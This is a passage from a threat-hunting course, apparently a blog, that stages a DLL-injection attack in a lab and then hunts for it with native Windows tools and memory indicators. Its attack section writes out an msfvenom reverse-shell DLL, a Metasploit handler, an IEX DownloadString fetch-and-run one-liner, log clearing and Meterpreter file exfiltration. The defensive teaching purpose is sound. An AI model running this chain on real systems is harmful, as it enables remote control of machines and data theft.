So let's jump into a bit of theory that will help us understand just what we are getting up to once we get to the actual attack, which will follow immediately afterwards.

# Theory
# what is a DLL?
As succinct as possible, a DLL is a file containing shared code. It's not a program or an executable in and of itself, rather a DLL is in essence a collection of functions and data that can be used by other programs. 

So think of a DLL as a communal resource: let's say you have 4 programs running and they all want to use a common function - let's say for the sake of simplicity the ability to minimize the gui window. Now instead of each of those programs having their own personal copy of the function that allows that, they'll instead access a DLL that contains the function to minimize gui windows instead. So when you click on the minimize icon and that program needs the code to know how to behave, it does not get instructions from its own program code, rather it pulls it from the appropriate DLL with some help from the Windows API. 

Thus any program you run will constantly call on different DLLs to get access to a wide-variety of common (and often critical) functions and data.

# what is a classical DLL-injection?
So keeping what I just mentioned in mind - that any running program is accessing a variety of code from various DLLs at any time - what then is a DLL-injection attack? Well in a normal environment we have legit programs accessing code from legit DLLs. 

With a DLL-injection attack an attacker enters into the population of legitimate DLLs a malicious one, that is a DLL that contains the code the attacker wants executed. Once the malicious DLL is ready, the attacker then basically tricks a legitimate app into loading it into its memory space and then executing it. Thus a DLL injection is a way to get another program to run your code, instead of creating a program specifically to do so. 

Threat actors love injecting DLLs for two main reasons. First, injected code runs with the same privileges and the legitimate process - meaning potentially elevated. Second, doing so makes it, in general, much harder to detect. There's no longer an opportunity to find a "smoking gun" .exe file, rather to find anything malicious we need to peer beneath the processes at an arguably more convoluted level of abstraction. 

So that's DLL injection in a nutshell, but what then is *standard* DLL-injection? Well there are a few ways in which to achieve the process I described above, of which standard is one such way. What distinguishes it is that the malicious DLL is first written to the victim's disk before being loaded. This can quite obviously considered a design flaw that makes our lives as threat hunters easier since disk-based fingerprints are not ephemeral. 

As a side-note: the thus logical evolutionary improvement on standard DLL-injections are *reflective loading* DLL-injections. Instead of writing the malicious DLL to disk, they inject it directly into memory thereby increasing the volatility of any evidence. But hold that thought until our next course, where we'll be covering it.

{{< figure src="/img/hold.gif" title="" class="custom-figure" >}}

# What is a Command and Control (C2) Stager, Server, and Payload?

Let's start by sketching a scenario of how many typical attacks play out these days. An attacker sends a spear-phishing email to an employee at a company. The employee, perhaps tired and not paying full attention, opens the so-called *"urgent invoice"* attached to the email. 

{{< figure src="/img/drevil.gif" title="" class="custom-figure" >}}

Opening this attachment executes a tiny program called a `stager`. A stager, though not inherently malicious, "sets the stage" by performing a specific task: it reaches out to a designated address, often a web server owned by the hacker, to download + execute another piece of code.

This new code properly establishes the attacker's presence on the victim's system. It acts as a "gateway," allowing the attacker to execute commands on the victim's system from their own. And this system, the one they use to execute commands on that of the victim, is what we call the `C2 Server`. 

And finally the code the stager downloaded, allowing the C2 server to establish its control on the victim's system, is called a `payload`, though depending on the exact context as well as framework may be called an `implant` (a more generic term), or a `beacon`. The latter is reserved for the type of implants used by for example Cobalt Strike which do not maintain a continuous, persistent network connection (which can raise suspicion), but instead performs a high latency, asynchronous periodic "check in". 

# References

So though admittedly the previous sections is a somewhat shallow overview of these complex terms, I do think this does suffice for the purposes of moving ahead with the practical component of our course. However in case you wanted to understand it to a greater depth, here are my top picks for this topic:

[Keynote: Cobalt Strike Threat Hunting | Chad Tilbury](https://www.youtube.com/watch?v=borfuQGrB8g)

[In-memory Evasion - Detections | Raphael Mudge](https://www.youtube.com/watch?v=lz2ARbZ_5tE)

[Advanced Attack Detection | William Burgess +  Matt Wakins](https://www.youtube.com/watch?v=ihElrBBJQo8)


# ATTACK!

Finally! Let's get at it... 

{{< figure src="/img/attack_kip.gif" title="" class="custom-figure" >}}

1. First things first - fire up both your Windows 10 and Kali VMs.
2. On our Kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155** NOTE: Yours will be different!

{{< figure src="/img/image032.png" title="" class="custom-figure" >}}

3. Now go to the Windows VM. Open an administrative PowerShell terminal. Run `ipconfig` so we also have the ip of the victim - write this down. 

{{< figure src="/img/image033.png" title="" class="custom-figure" >}}

4. And now, though it's not really required, I just like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.

{{< figure src="/img/image034.png" title="" class="custom-figure" >}}

5. Next we'll just create a simple text file on the desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the desktop, `New` > `Text document`, give it a name and add some generic content. 

{{< figure src="/img/image035.png" title="" class="custom-figure" >}}

6. Next we want to start capturing our packet capture using `WireShark`. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 

7. And now finally, right before we start our attack I also want to clear both logs we activated - Sysmon and PowerShell ScriptBlock. You see since we've enabled it, it's likely recorded a bunch of events completely irrelevant to our interest here. So we'll clear them and start a new so our final capture is undiluted. Open a PowerShell terminal as admin, and then run the following commands.
```
wevtutil cl "Microsoft-Windows-Sysmon/Operational”
```
```
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

{{< figure src="/img/image036.png" title="" class="custom-figure" >}}

Great now that everything is setup let's generate our stager and transfer it over to the victim. 
1. On our Kali VM open your terminal.
2. We are going to run the command below, which will generate a payload for us using `msfvenom` (a standalone app that is part of the Metasploit framework). Note the following:
- `Lhost` is the IP of the **listening** machine, ie the attacker. Yours will be different than mine here, adapt it!
- `Lport` is the port we will be listening on. This could be anything really, you can see in this case I chose an arbitraty port 88. You should be aware however that some victim systems may have strict rules regarding which outbound ports are allowed to be used, in these cases a standard port such as 80/443 would be a safer choice. Feel free to experiment/choose any port you'd like\
- `-f` designates the file type, which of course is DLL in this case.
- `>` indicates where we wish to save it, as well as the name we are giving to it, you can see I am saving it on my desktop as `evil.dll` - very subtle!

```
sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 -f dll > /home/hacker/Desktop/evil.dll
```

{{< figure src="/img/image037.png" title="" class="custom-figure" >}}

3. Next we want to tranfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a very simply http server by running a single python command (see below). Again `8008` represents an arbitrary port, feel free to choose something else

```
python3 -m http.server 8008
```

{{< figure src="/img/image038.png" title="" class="custom-figure" >}}

4. Now we'll head over to the victim's system, we can either run a powershell command to download the file, or very simply open the browser (Edge) and type in the address bar write `http://[IP of hacker]:[port of http server]`, for example:

{{< figure src="/img/image039.png" title="" class="custom-figure" >}}

5. As you can see in the image above, you should see the dll file. If you don't, you either did not generate it, OR most likely you are not running the http server from the same directory. Now simply right-click on the DLL, `Save link as`, and in my case I will save it to desktop. Note that Edge may block the download, for example: 

{{< figure src="/img/image040.png" title="" class="custom-figure" >}}

If this is the case, click on the three dots `...` to the right of this message (More actions), and select `Keep`. You'll be confronted with another warning, select `Show more`, then `Keep anyway`. That should have finally done the trick!

{{< figure src="/img/image042.png" title="" class="custom-figure" >}}

Ok, we now have our malicious DLL on the victim's disk. 

6. So as we shared in the theory section of this course, this initial stager does one thing (at least on main thing): it calls back to the attacking machine to establish a connection and put in motion the subsequent series of events. But we can't run it just yet since we need something on our attacking machine that is actually listening and awaiting that call, ie the handler. So let's head over to our Kali VM, and in the terminal we'll run the following commands:
- `msfconsole`: this will open our metasploit console. 
- ` use exploit/multi/handler`: this sets up a generic payload handler inside the Metasploit framework. The `multi` in the command denotes that this is a handler that can be used with any exploit module, as it is not specific to any particular exploit or target system. The `handler` part of the command tells Metasploit to wait for incoming connections from payloads. Once the exploit is executed on the target system, the payload will create a connection back to the handler which is waiting for the incoming connection.
- `set payload windows/meterpreter/reverse_tcp`:  tells Metasploit what payload to use in conjunction with the previously selected exploit. The payload is the code that will be executed on the target system after a successful exploit. `windows`: This tells the framework that the target system is running Windows. `meterpreter`: Meterpreter is a sophisticated payload that provides an environment for controlling, manipulating, and navigating the target machine. `reverse_tcp`: This creates a reverse TCP connection from the target system back to the attacker's system. When the payload is executed on the target system, it will initiate a TCP connection back to the attacker’s machine (where Metasploit is running).

{{< figure src="/img/image043.png" title="" class="custom-figure" >}}

7. We now need to set required parameters, to see which ones are required run `show options`.

{{< figure src="/img/image044.png" title="" class="custom-figure" >}}

We can see there are 3 required parameters. The first one `EXITFUNC` is good as is. Meaning we need only to provide values for `LHOST` and `LPORT`, which is the exact same value we provided when we generated our `msfvenom` stager in step 2 - ie the attacker IP, as well as the port we chose (**88**).

8. We can now set these values with two commands:
- `set LHOST 192.168.230.155` (Note: change IP to YOURS)
- `set LPORT 88`

{{< figure src="/img/image045.png" title="" class="custom-figure" >}}

9. Now to start the listener we can use one of two commands, there's literally no difference. You can either use `run`, or `exploit`. 

{{< figure src="/img/image046.png" title="" class="custom-figure" >}}

So now that we have our handler listening for a callback we can go back to our Windows VM to run the code. 

**Performing the standard DLL-injection**

Next we need to perform a bit of Macgyvering...

{{< figure src="/img/macgyver.gif" title="" class="custom-figure" >}}

Here's the thing - to perform the injection we need another script which will get an actual process to inject `evil.dll` into its memory space. By far the most common and effective script to perform this is called [`Invoke-DllInjection.ps1`.](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)

Usually in order to run this next attack we'll use a PowerShell command to download the script [directly from the original github repo](https://github.com/PowerShellMafia/PowerSploit) and inject it directly into memory. The unfortunate thing is that this incredible artifact has not been updated in a few years, and since it's also been archived it's unlikely it ever will. 

The code as it currently stands on the original repo is however broken, at least when I tried it (in multiple configurations). The good news though is I found a simple fix and have updated the script which is now being hosted on [my github repo here](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1).

And thus, just so you are aware, we are going to download and inject into memory the script from my personal Github repo but **in no way whatsoever do I want to appear as taking any credit/ownership for it**. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 

1. Back on our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 

{{< figure src="/img/image047.png" title="" class="custom-figure" >}}

2. Now we'll run the following command, as mentioned before: it's going to download a script hosted on a webserver and then inject it directly into memory. This is a good example of what living off the land is all about - utilizing everyday components while not leaving any residue on the hard drive. 

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
```

Note that after you run it there won't be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you'll get some red text telling you what went wrong. 

Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, but we've not yet executed it. We're about to do so, but before that there's one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically "trick" a legit process into running code from a malicious DLL. So this script is what's going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.

Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almost always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)

So as to not overcomplicate things, and because it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, I'll be running a portable executable called rufus.exe. It's a very small, simple program that creates bootable usb drives, but that's irrelevant we just need some process. If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 

3. So we will run `rufus.exe`. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.

{{< figure src="/img/image048.png" title="" class="custom-figure" >}}

4. And now all the pieces are in place so we can run the actual command below. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal. 

```
Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
```

{{< figure src="/img/image049.png" title="" class="custom-figure" >}}

5. We see some output, now to know if it worked let's head on back to our Kali VM. We can immediately see that we received the connection and are now in a `meterpreter` shell - success!

{{< figure src="/img/popped_shell.gif" title="" class="custom-figure" >}}

{{< figure src="/img/image050.png" title="" class="custom-figure" >}}

6. We can run a few commands if we'd like, also we'll exfiltrate the "nuclear launch codes" we created in the beginning. 

```
download C:\\Users\\user\\Desktop\\top_seekrit.txt /home/hacker/Desktop/
```
{{< figure src="/img/image051.png" title="" class="custom-figure" >}}

Additionally, we can also drop into a `shell`.

{{< figure src="/img/image052.png" title="" class="custom-figure" >}}

That's it for our attack!

# Artifact Collection

One final thing before we move one: lets concretize all our forensic artifacts.

First we'll export our Sysmon log, run the following command in an administrative PowerShell terminal:
```
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Users\User\Desktop\SysmonLog.evtx”
```

Stay in the same administrative PowerShell terminal so we can also export our PowerShell ScriptBlock logs:
```
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "C:\Users\User\Desktop\PowerShellScriptBlockLog.evtx" "/q:*[System[(EventID=4104)]]"
```

Now let's stop our packet capture: 
1. Open WireShark.
2. Press the red STOP button.
3. Save the file, in my case I will save it to desktop as `dllattack.pcap`.

And finally we'll dump the memory for our post-mortem analysis:
1. Open a `Command Prompt` as administrator. 
2. Navigate to the directory where you saved `winpmem`, in my case it's on the desktop.
3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory

```
winpmem.exe memdump.raw
```

Awesome. We're ready to move on to our analysis, however I wanna take a kinda "detour" chapter next to grant us a bit of perspective. If it sounds a bit befuddling now, please venture forth - soon it will make sense. 

{{< figure src="/img/confused_dude.gif" title="" class="custom-figure" >}}

***

# Shenanigans! A (honest) review of our attack

OK so let's just hold back for a second. At this point, if you have your wits about you, you might, and rightfully so I'll add, be calling **shenanigans** on me. 

{{< figure src="/img/shenanigans.gif" title="" class="custom-figure" >}}

"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening"? Look at the meta: the whole point of establishing C2 on the victim is so we can run commands on it, but we literally just allowed ourselves to freely run commands on the victim so that we can establish C2. We wrote our malicious DLL to disk, injected our DLL-injection script into memory, and ran the script all from the comfort of Imaginationaland.

{{< figure src="/img/imagination.gif" title="" class="custom-figure" >}}

So then the answer is yes. That was cheating - of course. But, it's cheating with a purpose you see, the purpose here being that this is a course on threat hunting and not on initial compromise. So we stripped the actions of the initial compromise down to its core and for now we've foregone our spearfishing email and VBA macro. We've streamlined the essence of the attack - we're expending less energy in the effort, and yet for our intents have created the same outcome. If you wanted a more realistic approximation of the initial compromise + other elements of Red Teaming - [here's a good free resource to get you going](https://www.youtube.com/watch?v=EIHLXWnK1Dw&list=PLBf0hzazHTGMjSlPmJ73Cydh9vCqxukCu)
 

So, we won't be investing our time in completely recreating a realistic simulation of the intial compromise, HOWEVER, I do think it's very important for us to discuss here what it would look like. We are about to embark on a Threat Hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific "cheating" method here. Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual acttack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack. 

So the remainder of this section will be dedicated to that. I'm very briefly going to review all the main beats to the attack we just performed, thereafter I'll "translate" the actions to their real-world counterpart, pointing out specifically which elements we expect to see in an actual attack, and which we don't. 

Here's what we just did in our attack:
1. We crafted a malicious DLL on our system.
2. We transferred this DLL over to the victim's system.
3. We opened a meterpreter handler on our system.
4. We then downloaded a powershell script from a web server, and injected it into the victim's memory.
5. We opened a legitimate program (rufus.exe).
6. We then ran the script we downloaded in #4, causing the malicious dll from #1/2 to be injected into the memory space of #5.
7. The injected DLL is executed, calling back to the handler we created in #3, thereby establishing our backdoor connection.
8. We exfiltrated some data using our meterpreter shell.
9. We used our meterpreter shell to spawn a command prompt shell.
10. We ran a simple command in the new shell (whoami).

OK. Now let's review what an actual attack might have looked like, how these same steps and outcomes would more accurately be represented:
1. An attacker does some recon/OSINT, discovering info that allows them to craft a very personalized email to a company's head of sales as part of a spearphishing campaign.
2. The attacker included in this email a word document labelled "urgent invoice", and by using some masterful social engineering techniques they convince the head of sales to immediately open the document to pay it.
3. With macros enabled, once the head of sales opens the invoice it runs an embedded VBA macro, which contains the adversary's malicious code. 
4. This code can do many, and even all, of the things we did manually:
    - It can download the malicious DLL.
    - It can inject the script responsible for performing the attack into memory.
    - It can also run the actual script.
5. Note however that the script does not neccessarily do everything as we described above. It might only go and download instructions, which then allow it to perform subsequent steps. There exists here, as in so many areas of cybersecurity, strategic trade-offs. If the initial VBA macro contains all the instructions that's great since it now has less work to do downloading further instructions. Thus risk is minimized from an activity POV (less steps), however it also means the file will be relatively larger, which can increase the risk of being detected (more noticeable). All to say: both approaches are feasible and have been observed in real attacks, it really depends on the overall risk-mitigation strategy selected by the adversary. 
6. In our simulation we chose a program (rufus.exe) and even opened it ourselves. In an actual attack this highly improbable since it represents unnecessary risk. Rather, the attacker would select a process that is already running to inject into, which could even lead to elevated privileges. Other considerations would also be selecting processes that are less likely to be terminated or restarted. Common targets might include svchost.exe, explorer.exe, or other system processes.

So that's basically it - I hope this helps you understand how our attack lead to the same outcomes, but just followed another path to get there in the interest of efficiency.

There is one final thing I want to address, another thing that, if you're paying attention you might be wondering why exactly did we do this? If you take a moment to think about it, the initial VBA macro might as well simply just called back to the handler to establish a connection directly. This would have bypassed numerous steps (download + save dll, download + inject script, invoke script), each which represent a potential point of failure or detection. So why go through all this extra effort to get to the same result - a backdoor connection?

{{< figure src="/img/satan.gif" title="" class="custom-figure" >}}

The reason to go through these steps rather than just having the initial script call back to the handler is all about stealth. Yes our process might involve increased risk, but the end result is a connection mediated by an injected DLL and not an executable, which in general will be harder to detect. So again, this game is all about trade-offs: this process accepts a relatively higher degree of risk during the process of establishing itself on the victim's system, however once established it operates with a relatively lower degree of risk. 

Ok friends, thanks for entertaining this little side quest. I do so consciously with the full intent of ensuring you understand the why as much as the how. For now however let's move onto the first phase of our actual threat hunt - live analysis using native windows tools.

***

# LIVE ANALYSIS: NATIVE WINDOWS TOOLS
# Introduction
So our first analysis will be a quick review using standard (native) Windows tools. These tools are a quick and dirty means to get a finger on the pulse, meaning they'll give us a broad overview of some important indicators while at the same time being limited in the depth of information.

So if we have at our disposal better tools, ie tools that can provide more information, why bother? I'm of the belief (inspired by one the greats, [John Strand](https://twitter.com/strandjs)), that even if there are better tools availalbe you should *also* be able to do a basic analysis with the native Windows tools. 

Tools may change, they come and go, or, you might land in a situation where they are, for whatever reason, unavailable. Knowing how to get a basic read with Windows tools in any situation covers your bases. Think of it as learning how to survive in the outdoors - yes you can always make a fire using a lighter, but there's a good reason to also learn how to make it, however cumbersome, with what's freely available - it might just save your butt in case your lighter fails. 

{{< figure src="/img/survivorman2.gif" title="" class="custom-figure" >}}

# Theory
You will benefit from understanding the [following short theoretical framework on the '3 Modes of Threat Hunting'](https://www.faanross.com/posts/three_modes/). I leave the decision of whether or not to read it up to you, though it will be referenced throughout the remainder of the course. 

# Performing the Analysis
There are a number of things we can look at when we do a live analyis using the native tools, including: connections, processes, shares, firewall settings, services, accounts, groups, registry keys, scheduled tasks etc.

For this course we will only focus on connections and processes. If you are keen to learn more about how to investigate the other factors I suggest you view [this excellent talk by John Strand](https://www.youtube.com/watch?v=fEip9gl2MTA). A reminder that at this point we are in Threat Hunting Mode 1 - we presume compromise, but have not yet unearthed any confirmation thereof.

# Connections
Let's run `netstat`, which will display active network connections and listening ports. After all, most malware serves merely as a way for the adversary to ultimately have a connection to the victim's machine to run commands and exfiltrate data.

So open a PowerShell admin terminal on our Windows 10 system and run the following command:
```
netstat -naob
```
Note in particular the inclusion of `o` and `b` in our command which will also show the PID, as well as name of executable, involved in each connection.

In the results we can immediately see a variety of connections, as well as ports our system is listening on. Let's especially pay attention to `ESTABLISHED` connections.

And we can scroll through the list and then as threat hunters something unusual should stick out to us:

{{< figure src="/img/image071.png" title="" class="custom-figure" >}}

What exactly is unusual about this? Well even though `rundll32.exe` is a completely legitimate Windows process, it's used to load DLLs. The question then beckons: why exactly is it involved in an outbound connection?

In this case we can see it's connected to another system on our local network, but remember that's only because of our VLAN setup. In an actual attack scenario this would not be the case, meaning we see `rundll32.exe`, a process not known to be involved in creating network connections, now indeed being responsible for establishing a connection to a system outside of our network. 

In a typical scenario we'd immediately want to know more about this IP. Is it known? Is there a business use case associated with it? Are other systems on the network also connecting to it? Because if the answer to all those questions are no - well then we definitely have something strange on our hands.

So let's use our native Windows tools to learn more about this process. To do so however let's just take note of our PID, as can be seen in the image above mine is `3948`, yours will be different. 

# Processes

We want to know more about this process, however we specifically want to know: what command-line options were used to run it, what is it's parent process, and what DLLs are being used by the process.

Let's have a look at the DLLs, staying in our PowerShell terminal we run:
```
tasklist /m /fi "pid eq 3948"
```
{{< figure src="/img/image072.png" title="" class="custom-figure" >}}

On quick glance nothing seems unusual about this output - no DLL sticks out as being out of placed for `rundll32.exe`. So for now let's move on with the knowledge that we can always circle back and dig deeper if need be. 

Next let's have a look at the Parent Process ID (PPID):
```
wmic process where processid=3948 get parentprocessid
```
{{< figure src="/img/image073.png" title="" class="custom-figure" >}}

Great, we can see the PPID is `6944`, now let's figure out the name of the process it belongs to:
```
wmic process where processid=6944 get Name
```
{{< figure src="/img/image074.png" title="" class="custom-figure" >}}

We see thus that the name of the Parent Process, that is the name of the process that spawned `rundll32.exe` is `rufus.exe` - a program used to create bootable thumb drives. 

Now this, on quick glance this too seems unusual - why is this app needing to call `rundll32.exe`? However, since we're not an expert on this program's design, this could potentially be part of its normal operation - we'd have to jump in deeper to understand that.

Let's keep the bigger picture in mind again - we came upon `rundll32.exe` because it created a network connection to an external IP. So in that sense, yes this is very weird - why is a program used to create bootable thumb drives spawning `rundll32.exe` which then creates a network connection? Very sus.

One final thing here using our native tools, let's have a look at the command-line arguments:
```
wmic process where processid=3948 get commandline
```
{{< figure src="/img/image075.png" title="" class="custom-figure" >}}

We can see the command is nude - no arguments are provided. Well, since again the `rundll32.exe` command is typically used to execute a function in a specific DLL file, you would expect to see it accompanied by arguments specifying the DLL file and function it's supposed to execute. But here it's simply executed by itself, again reinforcing our suspicion that something is amiss. 

# Closing Thoughts
Again we started with an open mind, spotten an unusual process being involved in a network connection, and then using other native Windows tools learned more about this process. And the more we learned, the more our suspicion was confirmed. We can thus, in reference to the Three Modes of Threat Hunting, confidently say we're now in the second mode - building our case. Let's continue exploring in the realm of processes by digging deeper with `Process Hacker`.

***

# 6. Live Forensics: Process Hacker 2
# Introduction
I explained, hopefully in a somewhat convincing manner, why it's good practice for us to learn how to use the native Windows tools to get an initial, high-level read. But of course these tools are also limited in what information they can provide.

So now let's bring out the big guns and learn all we can.

{{< figure src="/img/guns.gif" title="" class="custom-figure" >}}


But alas, as these things go, it really behooves us to learn a bit of theory behind what we're going to look at with the intention of understanding why it is we are looking at these things, and what exactly what we will be looking for. 

Indeed, in matters like these, it is beneficial for us to delve into some theory. This will help us better comprehend what we're about to examine. We aim to understand why we are scrutinizing these things. Furthermore, it's essential to clarify exactly what we will be searching for.

# Theory

***"A traditional anti-virus product might look at my payload when I touch disk or load content in a browser. If I defeat that, I win. Now, the battleground is the functions we use to get our payloads into memory. -Raphael Mudge"***

There are a few key properties we want to be on the lookout for when doing live memory analysis with something like `Process Hacker`. But, it's very important to know that there are **NO silver bullets**. There are no hard and fast rules where if we see any of the following we can be 100% sure we're dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.

Again we're building a case, and each additional piece of evidence serves to decrease the probability of a false positive. We keep this process up until our self-defined threshold has been reached and we're ready to push the big red button. 

Additionally, the process as outlined here may give the impression that it typically plays out as a strictly linear process. This is not necessarilly the case - instead of going through our list 1-7 below, we could jump around not only on the list itself, but with other techniqes completely. As a casual example - if we find a suspicious process by following this procedure, we might want to pause and 

have the SOC create a rule to scan the rest of the network looking for the same process. If we for example use **Least Frequency Analysis** and we see the process only occurs on one or two anomalous systems, well that then not only provides supporting evidence, but also gives us the confirmation that we are on the right path and should continue with our live memory analysis. 

Here's a quick overview of our list:
1. Parent-Child Relationships
2. Signature - is it valid + who signed?
3. Current directory
4. Command-line arguments 
5. Thread Start Address
6. Memory Permissions
7. Memory Content

Let's touch on each a little more:
1. ***Parent-Child Relationships***
As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (`Parent`), typically spawn other processes (`Child`). And since in the current age of Living off the Land malware the processes themselves are not inherently suspiocus - after all they are legit processes commonly used by the system - we are more interested in the relationship with Parent and Child. We should always ask: *what spawned what*?

Because often we'll find a parent process that is not suspicious by itself at all, and equally a child process that we'd expect to see running. But the fact that this specific parent spawned that specific child - we'll that's sometimes off. A great example

Another thing is certain Parent-Child relatipnship will not only inicate that something is suspicious, but also act as a sort of signature implicating the potential malware involved. For example a classical Cobalt Strike Process Tree might look like this:

{{< figure src="/img/image076.png" title="" class="custom-figure" >}}

At the top we can see WMI spawning PowerShell - that itself is pretty uncommon, but used by a variety of malware software. But there's more - PowerShell spawning PowerShell. Again, not a smoking gun but unusual, and something seen with Cobalt Strike. But really the most idiosyncratic property here is the multiple instances of rundll32.exe being spawned. This is a classical Cobalt Strike strategy in action - the use of so-called sacrificial process. Plus the fact that it's rundll32.exe in particular - this is the default setting for Cobalt Strike. It might surprise you but *in situ* it's estimated that about 50% of adversaries never bother changing the default. Which makes one wonder - are they lazy, or are we so bad at detecting even default settings that they don't see the point in even bothering?

All this to say - we'll look for unusual Parent-Child Relationships, and we'll do so typically by looking at a `Process Tree` which shows as all processes and their associated relationships. In the discussion above I might have given the impression that these relationships all exist in pairs with a unidirectional relationship. Not so, just as in actual family trees a parent can spawn multiple children, and each of these can in turn spawn multiple children etc. So depending on the exact direction of the relationship, a process may be a parent or a child. 

2. ***Signature - is it valid + who signed?***
This is definitely one of the lowest value indicators - something that's nice to help build a case, but by itself, owing to so many potential exceptions, is quite useless. Nevertheless if we see that a process is unsigned, or signed by an untrusted source, we may layer it onto our case. 

3. ***Current directory***
There are a number of things we can look for here. For example we might see a process run from a directory we would not expect - instead of `svchost.exe` running from `C:\Windows\System32`, it ran from `C:\Temp` - uh-oh. 

Or, perhaps we see powershell, but it's running from `c:\windows\syswow64\...`, which by itself is a completely legitimate directory. But what's it purpose? Well, this basically means it's 32-bit code that was run. Now 32-bit systems still exist, but the vast majority of systems now are 64-bit. Malware however, still loves to use 32-bit code since it gives it the biggest reach - it can now infect both 32-bit and 64-bit systems. 

So if we saw PowerShell running from that directory, it's an artifact produced when 32-bit code is run, which requires 32-bit PowerShell. Using this on a modern, 64-bit system is pretty unusual.

All this to say: the directory can potentially tell us something about the legitimacy of the process

4. ***Command-line arguments***
We already saw this in the previous section - for example though running `rundll32.exe` is completely legit, we would expect it to have arguments referencing the exact functions and libraries it's supposed to load. Seeing it nude, well that's strange. Same goes for many other processes - we need thus to understand their function and how they are invoked to be able to determine the legitimacy of the process. 

Note that 1-4 above are not unique to dll-injections, but can be seen in malware in general. Our final 3 indicators we expect however only to see in relation to dll-injections. 

5. ***Thread Start Address***

Sure, I'll try to provide some context around the statement.

When a DLL is loaded the traditional way, i.e., from a disk, the operating system memory-maps the DLL into the process's address space. Memory mapping is a method used by the operating system to load the contents of a file into a process's memory space, which allows the process to access the file's data as if it were directly in memory. The operating system also maintains a mapping table that tracks where each DLL is loaded in memory.

With traditional DLL loading, if you were to look at the start address of the thread executing the DLL, you would see a memory address indicating where the DLL has been loaded in the process's address space.

However, in the case of Reflective DLL Injection, the DLL is loaded into memory manually without the involvement of the operating system's regular DLL-loading mechanisms. The custom loader that comes with the DLL takes care of mapping the DLL into memory, and the DLL never touches the disk. Since the operating system isn't involved in the process, it doesn't maintain a mapping table entry for the DLL, and as such, the start address of the thread executing the DLL isn't available. 

As a result, when you inspect the start address of the thread associated with the injected DLL, it will not show the actual memory address where the DLL is loaded. Instead, it will show `0x0`, which essentially means the address is unknown or not available. This is one of the many ways Reflective DLL Injection can be stealthy and evade detection.

Thus this is only for reflective DLL loading!

{{< figure src="/img/image077.png" title="" class="custom-figure" >}}


6. ***Memory Permissions***
One of the most common, well-known heuristics for injected malware is any memory region with RWX permissions. Memory with `RWX` permissions means that code can be written into that region and then subsequently executed. This is a capability that malware often utilizes, as it allows the malware to inject malicious code into a running program and then execute that code. The *vast* majority of legitimate software will not behave in this manner.

But be forewarned - RWX permissions are the tip of the iceberg in this game of looking for anomalies in memory permissions.It’s not the only one but many people stay stuck on it as if it’s the be all and end all.

Modern malware authors, knowing `RWX` not only sticks out like a thumb but can easily be prevented using a Write XOR Execute security policy, will have an initial pair of permissions (`RW`), and will then afterwards change permissions to `RX`. 

For now however we will focus only on `RWX`, but of course as we advance we will be looking at `odd pairs` in the future. 


7. ***Memory Content***
Once we find a memory space with unusual permissions we then also want to check its content for signs of a PE file. Let's have a brief overview of the PE file structure below:

{{< figure src="/img/image078.png" title="" class="custom-figure" >}}

We can see two things that always stick out: the magic bytes and a vestigial string associated with the `DOS Stub`. Magic bytes are predefined unique values used at the beginning of a file that are used to identify the file format or protocol. For a PE file, we would expect to see the ASCII character `MZ`, or `4D 5A` in hex. 

Then the string `This program cannot be run in DOS mode` is an artifact from an era that some systems only ran DOS. However the string is still kept there for mainly historical reasons. For us in this case however it's a useful thumbprint, informing us we're dealing with a PE file. 

